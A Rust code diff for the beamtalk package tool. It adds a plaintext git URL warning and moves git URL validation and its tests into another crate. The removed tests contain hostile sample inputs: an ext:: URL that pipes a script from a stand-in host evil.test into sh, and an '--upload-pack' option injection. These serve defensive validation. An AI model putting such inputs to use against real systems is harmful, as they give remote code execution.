@@ -13,9 +13,25 @@ use beamtalk_core::compilation::GitReference;
 use camino::{Utf8Path, Utf8PathBuf};
 use miette::{Context, IntoDiagnostic, Result};
 use std::process::Command;
-use tracing::{debug, info};
+use tracing::{debug, info, warn};
 
 use super::lockfile::LockEntry;
+
+// The URL screen lives in `beamtalk-package` so the manifest parser applies the
+// same rules (BT-5068); re-exported so existing `git::validate_git_url` call
+// sites are unchanged.
+pub use beamtalk_package::manifest::{is_plaintext_git_url, validate_git_url};
+
+/// Warn when a manifest names a git dependency over an unauthenticated
+/// plaintext transport (`http://`, `git://`).
+pub fn warn_if_plaintext_url(name: &str, url: &str) {
+    if is_plaintext_git_url(url) {
+        warn!(
+            dependency = name,
+            url, "Git dependency uses an insecure plaintext URL; prefer https:// or ssh://"
+        );
+    }
+}
 
 /// Result of resolving a single git dependency.
 #[derive(Debug, Clone)]
@@ -101,6 +117,7 @@ pub fn resolve_git_dep(
     }
 
     // Clone the repository
+    warn_if_plaintext_url(name, url);
     info!(name, url, "Cloning git dependency");
     clone_repo(name, url, &checkout_path)?;
 
@@ -219,79 +236,6 @@ fn clone_command(url: &str, target: &Utf8Path) -> Option<Command> {
     ])
     .current_dir(parent);
     Some(cmd)
-}
-
-/// Transports a dependency URL may legitimately use.
-///
-/// Deliberately excludes git's `ext::` and `fd::` helper transports: `ext::`
-/// runs an arbitrary shell command, so a URL carrying it is code execution, not
-/// a fetch.
-const ALLOWED_URL_SCHEMES: &[&str] = &["https://", "http://", "ssh://", "git://", "file://"];
-
-/// Reject dependency URLs that git would not treat as a plain remote.
-///
-/// Registry dependencies take their URL from the registry index — third-party
-/// data — so this runs on every clone rather than trusting the manifest author.
-///
-/// # Errors
-///
-/// Returns an error if the URL is empty, looks like a command-line option, or
-/// uses a transport outside [`ALLOWED_URL_SCHEMES`].
-pub fn validate_git_url(name: &str, url: &str) -> Result<()> {
-    if url.trim().is_empty() {
-        miette::bail!("Dependency '{name}' has an empty git URL");
-    }
-
-    if url.starts_with('-') {
-        miette::bail!(
-            "Dependency '{name}' has an invalid git URL '{url}' — \
-             a URL may not begin with '-' (it would be read as a git option)."
-        );
-    }
-
-    if ALLOWED_URL_SCHEMES
-        .iter()
-        .any(|scheme| url.starts_with(scheme))
-    {
-        return Ok(());
-    }
-
-    // Anything of the form `<helper>::<address>` is git's transport-helper
-    // syntax, which dispatches to `git-remote-<helper>` — `ext::` being the
-    // shell-executing one. None of the allowed schemes reach here, so a `::`
-    // at this point can only be a helper invocation.
-    if url.contains("::") {
-        miette::bail!(
-            "Dependency '{name}' has an unsupported git URL '{url}'.\n\n  \
-             '<transport>::' URLs are rejected: git dispatches them to a remote \
-             helper, and 'ext::' in particular executes an arbitrary command."
-        );
-    }
-
-    // `user@host:path` scp-style syntax has no scheme but is a normal git
-    // remote. Accept it only when it really looks like one: a non-empty host
-    // segment before the first colon that carries no slash, and a path that
-    // does not begin with `//`.
-    //
-    // That last condition is what keeps an unrecognised *scheme* out. Without
-    // it `badscheme://host/repo` splits into ("badscheme", "//host/repo") and
-    // reads as scp-style, and git would go looking for `git-remote-badscheme`
-    // on PATH — `protocol.ext.allow=never` only disables the built-in `ext::`
-    // helper, not arbitrary installed transport programs. A real scp-style
-    // path never starts with `//`.
-    let scp_like = url.split_once(':').is_some_and(|(host, path)| {
-        !host.is_empty() && !host.contains('/') && !path.starts_with("//")
-    });
-
-    if !scp_like {
-        miette::bail!(
-            "Dependency '{name}' has an unsupported git URL '{url}'.\n\n  \
-             Supported forms are https://, http://, ssh://, git://, file://, \
-             and user@host:path."
-        );
-    }
-
-    Ok(())
 }
 
 /// Describe a git reference for use in an error message, e.g. `tag 'v1.0.0'`.
@@ -882,66 +826,6 @@ mod tests {
 
         assert_eq!(result2.resolved_sha, expected_sha);
         assert!(!marker.exists(), "A changed URL must force a re-clone");
-    }
-
-    // ── URL validation ───────────────────────────────────────────────
-    //
-    // A registry dependency's URL comes from the registry index, so these are
-    // supply-chain guards, not just typo protection.
-
-    #[test]
-    fn test_validate_git_url_accepts_normal_remotes() {
-        for url in [
-            "https://github.com/jamesc/beamtalk-json",
-            "http://example.test/repo.git",
-            "ssh://git@example.test/repo.git",
-            "git://example.test/repo.git",
-            "file:///tmp/repo",
-            "git@github.com:jamesc/beamtalk-json.git",
-        ] {
-            assert!(validate_git_url("dep", url).is_ok(), "should accept {url}");
-        }
-    }
-
-    #[test]
-    fn test_validate_git_url_rejects_ext_transport() {
-        // `ext::` makes git run an arbitrary command — remote code execution
-        // if it reaches `git clone`.
-        let err = validate_git_url("dep", "ext::sh -c 'curl evil.test/x.sh|sh'").unwrap_err();
-        let msg = format!("{err:?}");
-        assert!(msg.contains("unsupported git URL"), "{msg}");
-    }
-
-    #[test]
-    fn test_validate_git_url_rejects_other_transport_helpers() {
-        assert!(validate_git_url("dep", "fd::7").is_err());
-        assert!(validate_git_url("dep", "transport::whatever").is_err());
-    }
-
-    #[test]
-    fn test_validate_git_url_rejects_unknown_scheme() {
-        // Would otherwise read as scp-style and send git looking for
-        // `git-remote-<scheme>` on PATH.
-        for url in [
-            "gitremote://evil.test/repo",
-            "badscheme://host/repo",
-            "git+ssh://host/repo",
-        ] {
-            assert!(validate_git_url("dep", url).is_err(), "should reject {url}");
-        }
-    }
-
-    #[test]
-    fn test_validate_git_url_rejects_option_lookalike() {
-        // Sits in a positional slot, so git would parse it as an option.
-        let err = validate_git_url("dep", "--upload-pack=touch /tmp/pwned").unwrap_err();
-        let msg = format!("{err:?}");
-        assert!(msg.contains("may not begin with"), "{msg}");
-    }
-
-    #[test]
-    fn test_validate_git_url_rejects_empty() {
-        assert!(validate_git_url("dep", "  ").is_err());
     }
 
     #[test]
